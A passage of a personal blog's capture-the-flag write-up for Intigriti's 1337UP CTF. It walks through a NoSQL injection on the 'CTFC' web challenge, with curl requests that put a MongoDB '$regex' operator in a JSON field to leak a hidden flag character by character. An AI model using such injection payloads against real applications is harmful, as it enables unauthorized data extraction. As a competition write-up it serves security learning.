@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="I particpated in Intigrity's 1337UP CTF competition this weekend. My team placed 32nd out of 686. I solved the entire OSINT category (1 of 1), and contributed to the Web category as well with a NoSQL injection challenge.">
+<title>1337UP CTF</title>
+
+<link rel='canonical' href='http://localhost:1313/p/1337up-ctf/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="1337UP CTF">
+<meta property='og:description' content="I particpated in Intigrity's 1337UP CTF competition this weekend. My team placed 32nd out of 686. I solved the entire OSINT category (1 of 1), and contributed to the Web category as well with a NoSQL injection challenge.">
+<meta property='og:url' content='http://localhost:1313/p/1337up-ctf/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='OSINT' /><meta property='article:tag' content='flask' /><meta property='article:tag' content='NoSQL Injection' /><meta property='article:tag' content='exiftool' /><meta property='article:published_time' content='2023-11-18T10:18:48-05:00'/><meta property='article:modified_time' content='2023-11-18T10:18:48-05:00'/>
+<meta name="twitter:title" content="1337UP CTF">
+<meta name="twitter:description" content="I particpated in Intigrity's 1337UP CTF competition this weekend. My team placed 32nd out of 686. I solved the entire OSINT category (1 of 1), and contributed to the Web category as well with a NoSQL injection challenge.">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#web">Web</a>
+      <ol>
+        <li><a href="#ctfc">CTFC</a></li>
+      </ol>
+    </li>
+    <li><a href="#osint">OSINT</a>
+      <ol>
+        <li><a href="#photographs">Photographs</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/1337up-ctf/">1337UP CTF</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            I particpated in Intigrity&#39;s 1337UP CTF competition this weekend. My team placed 32nd out of 686. I solved the entire OSINT category (1 of 1), and contributed to the Web category as well with a NoSQL injection challenge.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 18, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="web">Web
+</h2><h3 id="ctfc">CTFC
+</h3><blockquote>
+<p>I&rsquo;m excited to share my minimal CTF platform with you all, take a look! btw it&rsquo;s ImPAWSIBLE to solve all challenges 😺</p>
+<p>Note: flag format is INTIGRITI{.*}</p>
+<p>Author: Jopraveen</p>
+</blockquote>
+<hr>
+<p>We are provided with source code for the challenge, which details the interaction we can have. The important things to note are where the flag might be located with the Dockerfile, and how we can interact with the backend of the server. from the Dockerfile, we see the flag is stored as an environment:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat Dockerfile
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl"># Setup flask app &amp; create flag  
+</span></span><span class="line"><span class="cl">EXPOSE 80  
+</span></span><span class="line"><span class="cl">ENV FLASK_APP=/app/IntCTFC/app.py  
+</span></span><span class="line"><span class="cl">ENV FLASK_ENV=production  
+</span></span><span class="line"><span class="cl">ENV FLASK_RUN_PORT=80  
+</span></span><span class="line"><span class="cl">ENV FLASK_RUN_HOST=0.0.0.0  
+</span></span><span class="line"><span class="cl">ENV CHALL_FLAG=&#34;1337UP{fl4G_h3RE}&#34;  
+</span></span><span class="line"><span class="cl">ENV SECRET_KEY=&#34;fake_secret_key&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Secret keys are usually used for cookie signing, so this is not something interesting just yet. In the main <code>app.py</code>, we can see how the flag is used:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">createChalls</span><span class="p">():</span>  
+</span></span><span class="line"><span class="cl">       <span class="n">db</span><span class="o">.</span><span class="n">challs</span><span class="o">.</span><span class="n">insert_one</span><span class="p">({</span><span class="s2">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;28c8edde3d61a0411511d3b1866f0636&#34;</span><span class="p">,</span><span class="s2">&#34;challenge_name&#34;</span><span class="p">:</span> <span class="s2">&#34;C  </span>
+</span></span><span class="line"><span class="cl"><span class="n">rack</span> <span class="n">It</span><span class="s2">&#34;,&#34;</span><span class="n">category</span><span class="s2">&#34;: &#34;</span><span class="nb">hash</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_description</span><span class="s2">&#34;: &#34;</span><span class="n">My</span> <span class="n">friend</span> <span class="n">sent</span> <span class="n">me</span> <span class="n">this</span> <span class="n">random</span> <span class="n">string</span> <span class="err">`</span>  
+</span></span><span class="line"><span class="cl"><span class="n">cc4d73605e19217bf2269a08d22d8ae2</span><span class="err">`</span> <span class="n">can</span> <span class="n">you</span> <span class="n">identify</span> <span class="n">what</span> <span class="n">it</span> <span class="ow">is</span><span class="err">?</span> <span class="p">,</span> <span class="n">flag</span> <span class="nb">format</span><span class="p">:</span> <span class="n">CTFC</span><span class="p">{</span><span class="o">&lt;</span><span class="n">password</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span><span class="p">}</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_flag</span><span class="s2">&#34;: &#34;</span><span class="n">CTFC</span><span class="p">{</span><span class="n">cryptocat</span><span class="p">}</span><span class="s2">&#34;,&#34;</span><span class="n">points</span><span class="s2">&#34;: &#34;</span><span class="mi">500</span><span class="s2">&#34;,&#34;</span><span class="n">released</span><span class="s2">&#34;: &#34;</span><span class="kc">True</span><span class="s2">&#34;})  </span>
+</span></span><span class="line"><span class="cl">       <span class="n">db</span><span class="o">.</span><span class="n">challs</span><span class="o">.</span><span class="n">insert_one</span><span class="p">({</span><span class="s2">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;665f644e43731ff9db3d341da5c827e1&#34;</span><span class="p">,</span><span class="s2">&#34;challenge_name&#34;</span><span class="p">:</span> <span class="s2">&#34;M  </span>
+</span></span><span class="line"><span class="cl"><span class="n">eoW</span> <span class="n">sixty</span> <span class="n">IV</span><span class="s2">&#34;,&#34;</span><span class="n">category</span><span class="s2">&#34;: &#34;</span><span class="n">crypto</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_description</span><span class="s2">&#34;: &#34;</span><span class="n">hello</span> <span class="n">everyoneeeeeeeee</span> <span class="n">Q1RGQ3tu</span>  
+</span></span><span class="line"><span class="cl"><span class="n">MHdfZzBfNF90aDNfcjM0TF9mbDRHfQ</span><span class="o">==</span><span class="p">,</span> <span class="n">oops</span> <span class="n">sorry</span> <span class="n">my</span> <span class="n">cat</span> <span class="n">ran</span> <span class="n">into</span> <span class="n">my</span> <span class="n">keyboard</span><span class="p">,</span> <span class="ow">and</span> <span class="n">typed</span> <span class="n">these</span> <span class="n">ra</span>  
+</span></span><span class="line"><span class="cl"><span class="n">ndom</span> <span class="n">characters</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_flag</span><span class="s2">&#34;: &#34;</span><span class="n">CTFC</span><span class="p">{</span><span class="n">n0w_g0_4_th3_r34L_fl4G</span><span class="p">}</span><span class="s2">&#34;,&#34;</span><span class="n">points</span><span class="s2">&#34;: &#34;</span><span class="mi">1000</span><span class="s2">&#34;,&#34;</span><span class="n">released</span>  
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;: &#34;</span><span class="kc">True</span><span class="s2">&#34;})  </span>
+</span></span><span class="line"><span class="cl">       <span class="n">db</span><span class="o">.</span><span class="n">challs</span><span class="o">.</span><span class="n">insert_one</span><span class="p">({</span><span class="s2">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;38026ed22fc1a91d92b5d2ef93540f20&#34;</span><span class="p">,</span><span class="s2">&#34;challenge_name&#34;</span><span class="p">:</span> <span class="s2">&#34;I  </span>
+</span></span><span class="line"><span class="cl"><span class="n">mPAWSIBLE</span><span class="s2">&#34;,&#34;</span><span class="n">category</span><span class="s2">&#34;: &#34;</span><span class="n">web</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_description</span><span class="s2">&#34;: &#34;</span><span class="n">well</span><span class="p">,</span> <span class="n">this</span> <span class="n">challenge</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">fully</span> <span class="n">cre</span>  
+</span></span><span class="line"><span class="cl"><span class="n">ated</span> <span class="n">yet</span><span class="p">,</span> <span class="n">but</span> <span class="n">we</span> <span class="n">have</span> <span class="n">the</span> <span class="n">flag</span> <span class="k">for</span> <span class="n">it</span><span class="s2">&#34;,&#34;</span><span class="n">challenge_flag</span><span class="s2">&#34;: os.environ[&#39;CHALL_FLAG&#39;],&#34;</span><span class="n">points</span><span class="s2">&#34;:  </span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;1500&#34;</span><span class="p">,</span><span class="s2">&#34;released&#34;</span><span class="p">:</span> <span class="s2">&#34;False&#34;</span><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The third challenge is using the flag as an answer key, from the looks of it. In lines prior to this, we can note that the database service this challenge is using is MongoDB, a NoSQL type of database:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># db settings  
+</span></span><span class="line"><span class="cl">client = pymongo.MongoClient(&#39;localhost&#39;,27017)  
+</span></span><span class="line"><span class="cl">db = client.ctfdb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>when we enter the page, we are prompted to create an account. There are no limitations, so creating an account is very simple. When we enter, we see two challenges associated to the first 2 entries in the database:</p>
+<p><img src="/p/1337up-ctf/Images/chall.png"
+	width="925"
+	height="717"
+	srcset="/p/1337up-ctf/Images/chall_hu5498920412502027544.png 480w, /p/1337up-ctf/Images/chall_hu8216071503747432951.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="309px"
+	
+></p>
+<p>The third challenge is not there, but notice the &ldquo;release&rdquo; is set to &ldquo;False&rdquo; for the third one. When trying to answer questions for the one listed, we see the answers match what we expect from the database:</p>
+<p><img src="/p/1337up-ctf/Images/cryptocat.png"
+	width="835"
+	height="469"
+	srcset="/p/1337up-ctf/Images/cryptocat_hu11962926885360317813.png 480w, /p/1337up-ctf/Images/cryptocat_hu13153300459589956858.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="427px"
+	
+></p>
+<p>If we analyze our request using Burp proxy or perhaps just with Firefox&rsquo;s Network tool, we can see the request data being sent:</p>
+<p><img src="/p/1337up-ctf/Images/networkrequest.png"
+	width="948"
+	height="233"
+	srcset="/p/1337up-ctf/Images/networkrequest_hu4497488386912987334.png 480w, /p/1337up-ctf/Images/networkrequest_hu11450976670789320774.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="406"
+		data-flex-basis="976px"
+	
+></p>
+<p>In raw data:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;_id:1&#34;</span><span class="p">,</span><span class="nt">&#34;challenge_flag&#34;</span><span class="p">:</span><span class="s2">&#34;CTFC{cryptocat}&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we modify this request to <code>&quot;_id:3&quot;</code>, then perhaps we can send a request to the 3rd challenge. However, the answer will be the flag, which we do not know. Since this is NoSQL, we might be able to abuse <a class="link" href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#extract-data-information"  target="_blank" rel="noopener"
+    >NoSQL Injection</a> combined with regex queries to leak the flag. The concept goes as follows: using regex wildcards, we can generate a passing result despite knowing none of the characters. We can sequentially guess a single character 1 request at a time, and whenever we land on a correct one, the check will once again pass. For this, I copied my network request directly to <code>curl</code> although utilizing a tool such as Brupsuite will have a cleaner look to manage:</p>
+<p><img src="/p/1337up-ctf/Images/copycurl.png"
+	width="995"
+	height="233"
+	srcset="/p/1337up-ctf/Images/copycurl_hu18429906071922113792.png 480w, /p/1337up-ctf/Images/copycurl_hu5212618089273167940.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="427"
+		data-flex-basis="1024px"
+	
+>
+The unmodified curl request looks like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl &#39;https://ctfc.ctf.intigriti.io/submit_flag&#39; -X POST -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0&#39; -H &#39;Accept: */*&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; -H &#39;Accept-Encoding: gzip, deflate, br&#39; -H &#39;Referer: https://ctfc.ctf.intigriti.io/&#39; -H &#39;Content-Type: application/json&#39; -H &#39;Origin: https://ctfc.ctf.intigriti.io&#39; -H &#39;DNT: 1&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Cookie: session=eyJ1c2VyIjp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA.I5nW0lG2m4QufY4UuiKTpLmNqBM&#39; -H &#39;Sec-Fetch-Dest: empty&#39; -H &#39;Sec-Fetch-Mode: cors&#39; -H &#39;Sec-Fetch-Site: same-origin&#39; --data-raw &#39;{&#34;_id&#34;:&#34;_id:1&#34;,&#34;challenge_flag&#34;:&#34;CTFC{cryptocat}&#34;}&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To modify, we insert new JSON into the key for &ldquo;correct_flag&rdquo;, so that regex may be applied:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;challenge_flag&#34;</span><span class="err">:</span><span class="p">{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span><span class="s2">&#34;.*&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can confirm this works by checking regex with the flag header and brackets that we already know:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl &#39;https://ctfc.ctf.intigriti.io/submit_flag&#39; -X POST -H &#39;Us  
+</span></span><span class="line"><span class="cl">er-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0&#39; -H &#39;Accept  
+</span></span><span class="line"><span class="cl">: */*&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; -H &#39;Accept-Encoding: gzip, deflate, br&#39; -H &#39;Refe  
+</span></span><span class="line"><span class="cl">rer: https://ctfc.ctf.intigriti.io/&#39; -H &#39;Content-Type: application/json&#39; -H &#39;Origin: https:/  
+</span></span><span class="line"><span class="cl">/ctfc.ctf.intigriti.io&#39; -H &#39;DNT: 1&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Cookie: session=eyJ1c2Vy  
+</span></span><span class="line"><span class="cl">Ijp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA.  
+</span></span><span class="line"><span class="cl">I5nW0lG2m4QufY4UuiKTpLmNqBM&#39; -H &#39;Sec-Fetch-Dest: empty&#39; -H &#39;Sec-Fetch-Mode: cors&#39; -H &#39;Sec-Fe  
+</span></span><span class="line"><span class="cl">tch-Site: same-origin&#39; --data-raw &#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{.*}&#34;  
+</span></span><span class="line"><span class="cl">}}&#39;  
+</span></span><span class="line"><span class="cl">correct flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The response is correct flag! At this point it is probably better to just write a script to guess all combinations, or we can be mildly clever and do it manually with the slight help of extra regex. We can start by seeing if the first bracket char is lowercase by guessing <code>[a-z]</code>, or all lowercase chars between a and z:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl 
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">--data-raw &#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{[a-z].*}&#34;}}&#39;  
+</span></span><span class="line"><span class="cl">correct flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can guess half the alphabet, to narrow down which letter it might be:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{[a-m].*}&#34;}}&#39;  
+</span></span><span class="line"><span class="cl">correct flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After a couple more guesses, we narrowed down the range to 4 characters, a much easier guess than 26+:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{[g-k  
+</span></span><span class="line"><span class="cl">].*}&#34;}}&#39;
+</span></span><span class="line"><span class="cl">correct flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first letter is <code>h</code>, so in only ~6 guesses we managed to guess a letter. Pretty good, considering there are 26 possibilities in lowercase alone! Now we can repeat the process, keeping the 1st char as h and guessing the 2nd one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{h[a-  
+</span></span><span class="line"><span class="cl">z].*}&#34;}}&#39;  
+</span></span><span class="line"><span class="cl">wrong flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And so on.. Eventually, we can leak the entire flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;{&#34;_id&#34;:&#34;_id:3&#34;,&#34;challenge_flag&#34;:{&#34;$regex&#34;:&#34;INTIGRITI{h0w_1s_7h4t_PAWSIBLE}&#34;}}&#39;  
+</span></span><span class="line"><span class="cl">correct flag!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note that in this case the wildcard is gone, as a final check to see if the flag is complete. We don&rsquo;t really need the <code>$regex</code> json either.
+<code>INTIGRITI{h0w_1s_7h4t_PAWSIBLE}</code></p>
+<h2 id="osint">OSINT
+</h2><h3 id="photographs">Photographs
+</h3><blockquote>
